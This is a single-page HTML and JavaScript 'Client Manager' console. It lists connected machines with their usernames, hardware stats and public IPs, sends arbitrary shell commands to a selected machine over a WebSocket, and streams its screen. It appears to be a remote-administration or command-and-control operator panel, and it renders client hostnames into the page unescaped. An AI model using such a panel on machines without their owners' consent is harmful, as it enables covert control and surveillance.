<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Client Manager</title>
<style>
  body { font-family: sans-serif; }
  table { border-collapse: collapse; width: 100%; }
  th, td { border: 1px solid #ccc; padding: 4px; text-align: left; }
  th { background: #eee; }
</style>
</head>
<body>
<h1>Client Manager</h1>
<div id="clients"></div>
<h2>Taskmanager Details</h2>
<table>
  <tbody>
    <tr><th>Hostname</th><td id="hostname"></td></tr>
    <tr><th>Username</th><td id="username"></td></tr>
    <tr><th>CPU %</th><td id="cpu_percent"></td></tr>
    <tr><th>CPU Cores</th><td id="cpu_cores"></td></tr>
    <tr><th>CPU Threads</th><td id="cpu_threads"></td></tr>
    <tr><th>RAM Total</th><td id="ram_total"></td></tr>
    <tr><th>RAM Used</th><td id="ram_used"></td></tr>
    <tr><th>RAM Free</th><td id="ram_free"></td></tr>
    <tr><th>Disk Total</th><td id="disk_total"></td></tr>
    <tr><th>Disk Used</th><td id="disk_used"></td></tr>
    <tr><th>Disk Free</th><td id="disk_free"></td></tr>
    <tr><th>GPU Name</th><td id="gpu_name"></td></tr>
    <tr><th>GPU Load</th><td id="gpu_load"></td></tr>
    <tr><th>GPU Mem Total</th><td id="gpu_mem_total"></td></tr>
    <tr><th>GPU Mem Used</th><td id="gpu_mem_used"></td></tr>
    <tr><th>Net Sent</th><td id="net_bytes_sent"></td></tr>
    <tr><th>Net Recv</th><td id="net_bytes_recv"></td></tr>
    <tr><th>Uptime (min)</th><td id="uptime_minutes"></td></tr>
    <tr><th>Public IP</th><td id="public_ip"></td></tr>
    <tr><th>OS</th><td id="os"></td></tr>
  </tbody>
</table>

<input type="text" id="cmd">
<button onclick="sendCommand()">Send</button>
<button onclick="startScreen()">Start Screen</button>
<button onclick="stopScreen()">Stop Screen</button>
<img id="screen" style="max-width: 100%;">
<pre id="output"></pre>

<script>
let ws, selectedClient = null, allClients = {};

function loadClients() {
  fetch("/clients").then(r => r.json()).then(data => {
    let html = "";
    allClients = {};
    for (const [net, clients] of Object.entries(data)) {
      html += `<h2>${net}</h2><ul>`;
      clients.forEach(c => {
        allClients[c.id] = c;
        html += `<li>${c.hostname} (${c.status}) <button onclick="select('${c.id}')">Select</button></li>`;
      });
      html += "</ul>";
    }
    document.getElementById("clients").innerHTML = html;
  });
}

function updateDetails() {
  if (!selectedClient) return;
  fetch("/clients").then(r => r.json()).then(data => {
    let found = false;
    for (const clients of Object.values(data)) {
      for (const c of clients) {
        if (c.id === selectedClient) {
          found = true;
          const info = c.info || {};
          const keys = [
            'hostname','username','cpu_percent','cpu_cores','cpu_threads',
            'ram_total','ram_used','ram_free','disk_total','disk_used','disk_free',
            'gpu_name','gpu_load','gpu_mem_total','gpu_mem_used',
            'net_bytes_sent','net_bytes_recv','uptime_minutes','public_ip','os'
          ];
          keys.forEach(k => {
            const el = document.getElementById(k);
            if (el) el.textContent = info[k] || "";
          });
        }
      }
    }
    if (!found) {
      // Clear UI if client disappeared (optional)
      const keys = [
        'hostname','username','cpu_percent','cpu_cores','cpu_threads',
        'ram_total','ram_used','ram_free','disk_total','disk_used','disk_free',
        'gpu_name','gpu_load','gpu_mem_total','gpu_mem_used',
        'net_bytes_sent','net_bytes_recv','uptime_minutes','public_ip','os'
      ];
      keys.forEach(k => {
        const el = document.getElementById(k);
        if (el) el.textContent = "";
      });
    }
  });
}


function select(id) {
  selectedClient = id;
  updateDetails();
}

function connectAdmin() {
  ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/ws/admin");
  ws.onmessage = e => {
    if (typeof e.data === "string")
      document.getElementById("output").textContent += e.data + "\n";
    else
      document.getElementById("screen").src = URL.createObjectURL(new Blob([e.data]));
  };
}

function sendCommand() {
  if (selectedClient && ws && ws.readyState === 1) {
    ws.send(JSON.stringify({ target: selectedClient, cmd: document.getElementById("cmd").value }));
  }
}

function startScreen() {
  if (selectedClient) ws.send(JSON.stringify({ target: selectedClient, cmd: "screenshot_start" }));
}

function stopScreen() {
  if (selectedClient) ws.send(JSON.stringify({ target: selectedClient, cmd: "screenshot_stop" }));
}

setInterval(loadClients, 5000);
setInterval(updateDetails, 5000);
loadClients();
connectAdmin();
</script>
</body>
</html>
